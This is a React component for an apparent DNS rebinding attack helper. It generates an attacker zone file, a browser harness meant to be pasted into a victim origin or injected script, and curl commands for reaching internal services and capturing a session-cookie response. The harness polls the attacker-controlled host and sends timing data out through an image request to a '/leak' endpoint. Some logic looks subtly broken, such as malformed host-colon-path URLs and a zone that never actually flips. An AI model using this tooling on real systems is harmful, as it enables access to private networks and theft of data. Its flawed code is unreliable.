import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CopyChip,
  KVTable,
  NumberInput,
  OutputBlock,
  SectionTitle,
  Select,
  Slider,
  TextInput,
} from '@/components/ui';
import { DEFAULT_CALLBACK_HOST } from '@/tools/registry';

type RecordMode = 'A-single' | 'A-aaaa' | 'A-two';

const MODES: Array<{ value: RecordMode; label: string }> = [
  { value: 'A-single', label: 'A — one address' },
  { value: 'A-aaaa', label: 'A + AAAA — both families' },
  { value: 'A-two', label: 'A — two addresses (round-robin)' },
];

/** Resolver cache behaviour, seconds. Real-world observed clamps. */
const RESOLVERS: Array<{ value: string; label: string; clamp: number; note: string }> = [
  { value: 'browser', label: 'Browser resolver (Chrome / Firefox)', clamp: 60, note: 'Own DNS cache, honours TTL but applies a 60 s minimum on positive answers in some builds' },
  { value: 'systemd', label: 'systemd-resolved', clamp: 0, note: 'Honours low TTLs down to 1 s; negative answers cached per RFC 2308' },
  { value: 'dnsmasq', label: 'dnsmasq', clamp: 0, note: 'Honours TTL, but `--min-cache-ttl` is commonly set on routers' },
  { value: 'cloudflare', label: 'Cloudflare 1.1.1.1', clamp: 5, note: 'Clamps very low TTLs upward — 0 s is served as a 5 s floor' },
  { value: 'google', label: 'Google 8.8.8.8', clamp: 5, note: 'Similar 5 s clamp on zero TTLs' },
  { value: 'corp', label: 'Corporate forwarder', clamp: 300, note: 'Enterprise forwarders usually pin 300 s regardless of the zone TTL' },
];

function estimate(ttl: number, clamp: number, pinning: boolean, windowSec: number) {
  const effective = Math.max(ttl, clamp);
  if (pinning) return { effective, attempts: 0, probability: 0 };
  const window = Math.max(effective, 1);
  const attempts = Math.max(1, Math.floor(windowSec / window));
  // First answer binds for `effective` seconds; any later poll lands on the flip.
  const probability = 1 - Math.pow(1 - 1 / Math.max(window, 1), attempts);
  return { effective, attempts, probability: Math.min(probability, 0.99) };
}

export default function DnsRebindingHelper() {
  const [attackerHost, setAttackerHost] = useState('rebind.example.com');
  const [firstIp, setFirstIp] = useState('203.0.113.10');
  const [secondIp, setSecondIp] = useState('203.0.113.11');
  const [serverIp, setServerIp] = useState(DEFAULT_CALLBACK_HOST);
  const [target, setTarget] = useState('http://example.com');
  const [mode, setMode] = useState<RecordMode>('A-two');
  const [ttl, setTtl] = useState(0);
  const [resolver, setResolver] = useState('browser');
  const [pinning, setPinning] = useState(false);
  const [pollWindow, setPollWindow] = useState(60);

  const host = attackerHost.trim() || 'rebind.example.com';
  const targetUrl = target.trim() || 'http://example.com';
  const rv = RESOLVERS.find((r) => r.value === resolver) ?? RESOLVERS[0]!;
  const model = useMemo(() => estimate(ttl, rv.clamp, pinning, pollWindow), [ttl, rv.clamp, pinning, pollWindow]);

  const zone = useMemo(() => {
    const lines = [
      `; ${host} — rebinding zone, TTL ${ttl}`,
      '$ORIGIN ' + host + '.',
      `$TTL ${ttl}`,
      `@   IN A     ${firstIp}`,
      `@   IN NS    ns1.${host}.`,
      'ns1 IN A     ' + serverIp,
    ];
    if (mode === 'A-aaaa') lines.push(`@   IN AAAA  2001:db8::10`);
    if (mode === 'A-two') lines.push(`www IN A     ${secondIp}`);
    lines.push(`*   IN A     ${firstIp}`, `*.${host}. 60 IN TXT "rebind"`);
    return lines.join('\n');
  }, [host, ttl, firstIp, secondIp, serverIp, mode]);

  const harness = useMemo(
    () =>
      [
        "// Paste into the victim-origin console (or an injected script) — no CORS needed for 'no-cors' reads.",
        `const HOST = '${host}';`,
        'const POLL_MS = 300;',
        'const DEADLINE = Date.now() + ' + pollWindow * 1000 + ';',
        '',
        'async function hit(path) {',
        '  const t0 = performance.now();',
        '  try {',
        '    // mode: no-cors — the opaque response still resolves when the port is open.',
        `    await fetch('http://' + HOST + ':' + path, { mode: 'no-cors', cache: 'no-store' });`,
        '    return { ok: true, ms: Math.round(performance.now() - t0) };',
        '  } catch (e) {',
        '    return { ok: false, ms: Math.round(performance.now() - t0) };',
        '  }',
        '}',
        '',
        '(async () => {',
        "  const first = await hit('/first');   // attacker answers",
        "  console.log('first', first);",
        '  while (Date.now() < DEADLINE) {',
        '    await new Promise((r) => setTimeout(r, POLL_MS));',
        "    const second = await hit('/second'); // after TTL flip this reaches the victim",
        "    console.log('second', second);",
        '    if (second.ok && second.ms !== first.ms) {',
        "      document.title = 'rebind-confirmed';",
        `      new Image().src = 'http://${host}/leak?ms=' + second.ms;`,
        '      return;',
        '    }',
        '  }',
        "  console.log('no rebind within window');",
        '})();',
      ].join('\n'),
    [host, pollWindow],
  );

  const curl = useMemo(
    () =>
      [
        '# first hit — answer with the attacker address',
        `curl -s --resolve ${host}:80:${firstIp} http://${host}/first -H 'Host: ${host}'`,
        '',
        '# second hit — the same name now resolves to the victim internal service',
        `curl -s --resolve ${host}:80:${secondIp} http://${host}/admin -H 'Host: ${host}'`,
        '',
        `# the victim app itself, for a baseline of the response you expect to steal:`,
        `curl -s '${targetUrl}' -H 'Cookie: SESSION_ID=…' -o baseline.html`,
      ].join('\n'),
    [host, firstIp, secondIp, targetUrl],
  );

  const probe = useMemo(
    () => `curl -s "https://dns.google/resolve?name=${host}&type=A" | python3 -m json.tool | grep -E '"TTL"|"data"'`,
    [host],
  );

  return (
    <>
      <Card title="Rebinding setup">
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          <TextInput label="Attacker host" value={attackerHost} onChange={setAttackerHost} mono placeholder="rebind.example.com" hint="The DNS name you control; all probes use it" />
          <TextInput label="First answer" value={firstIp} onChange={setFirstIp} mono placeholder="203.0.113.10" hint="Attacker server — serves the harness" />
          <TextInput label="Second answer" value={secondIp} onChange={setSecondIp} mono placeholder="203.0.113.11" hint="Victim-side address the name must flip to" />
          <TextInput label="Attacker server address" value={serverIp} onChange={setServerIp} mono placeholder={DEFAULT_CALLBACK_HOST} hint="Where the harness and leak sink run" />
          <TextInput label="Victim application" value={target} onChange={setTarget} mono placeholder="http://example.com" hint="Baseline response you are trying to read post-flip" />
          <Select label="DNS record shape" value={mode} onChange={setMode} options={MODES} hint={mode === 'A-two' ? 'www answers second; apex keeps first — both live in one zone' : 'Single family keeps the flip window tight'} />
          <Select label="Resolver in the path" value={resolver} onChange={setResolver} options={RESOLVERS.map((r) => ({ value: r.value, label: r.label }))} hint={rv.note} />
          <Slider label="Zone TTL" value={ttl} onChange={setTtl} min={0} max={300} step={1} format={(v) => `${v} s`} />
          <NumberInput label="Poll window" value={pollWindow} onChange={setPollWindow} min={5} max={600} step={5} hint="Seconds the harness keeps polling" />
        </div>
        <div className="mt-4">
          <Checkbox checked={pinning} onChange={setPinning} label="Victim pins the resolved address" description="Simulate DNS pinning (resolver result cached for the connection lifetime)" />
        </div>
      </Card>

      <Card title="Timing model" action={<span className="rf-mono rounded bg-[var(--neutral-btn)] px-2 py-0.5 text-[12px] text-[var(--accent)]">TTL × cache</span>}>
        <div className="grid gap-4 lg:grid-cols-[1fr_1fr]">
          <KVTable
            rows={[
              ['Zone TTL', `${ttl} s`],
              ['Resolver floor', `${rv.clamp} s`],
              ['Effective cache', `${model.effective} s`],
              ['Polls inside window', String(model.attempts)],
              ['Estimated success', pinning ? 'pinned — 0 %' : `${(model.probability * 100).toFixed(1)} %`],
              ['Path', rv.label],
            ]}
          />
          <div className="space-y-3">
            <OutputBlock value={probe} rows={3} label="Pre-flight TTL check" />
            <Callout tone={pinning ? 'danger' : model.probability > 0.5 ? 'ok' : 'warn'} title={pinning ? 'Pinning defeats the flip' : 'Read the number as a ceiling'}>
              {pinning
                ? 'A pinned resolver keeps the first answer for the process lifetime; the flip never lands. Expect the harness to time out.'
                : `Probability = 1 − (1 − 1/window)^polls. Zero-TTL zones are served at ${rv.clamp} s or more by most public resolvers, so the practical window is ${rv.clamp} s, not 0.`}
            </Callout>
          </div>
        </div>
      </Card>

      <Card title="Zone file" action={<CopyChip text={zone} label="copy zone" />}>
        <OutputBlock value={zone} rows={9} label={`${host} zone stanza`} />
        <div className="mt-3 text-[11.5px] leading-relaxed text-[var(--text-faint)]">
          Serve with <span className="rf-mono">dnsmasq --no-resolv --address=/{host}/{firstIp}</span> for a quick flip, or
          point the wildcard at the attacker box and rotate the address from a small control API.
        </div>
      </Card>

      <Card title="Harness & replay">
        <SectionTitle>Browser harness</SectionTitle>
        <OutputBlock value={harness} rows={12} label="fetch('/first') → fetch('/second') poller" />
        <div className="mt-4">
          <SectionTitle>curl --resolve pair</SectionTitle>
          <OutputBlock value={curl} rows={9} label="First hit / second hit" />
        </div>
      </Card>

      <Card title="Detection & limits">
        <Callout tone="warn" title="What kills the attack">
          <ul className="m-0 list-disc pl-5">
            <li><strong>DNS pinning / rebinding protection</strong> — resolvers and some SSRF filters collapse the name to one address for the request lifetime.</li>
            <li><strong>Host-header revalidation</strong> — the internal app rejects an unexpected <span className="rf-mono">Host</span>, so the flip lands on a 421 or a default vhost.</li>
            <li><strong>Private-network blocking</strong> — resolvers that refuse RFC 1918 answers (0.0.0.0 / :: blocking) never return the flip.</li>
            <li><strong>TTL clamping</strong> — cache floors of 5–300 s widen the window but also let the victim see the same answer twice before it changes.</li>
            <li><strong>Browser cache</strong> — <span className="rf-mono">cache: 'no-store'</span> prevents the HTTP layer from hiding the second request.</li>
          </ul>
        </Callout>
      </Card>
    </>
  );
}
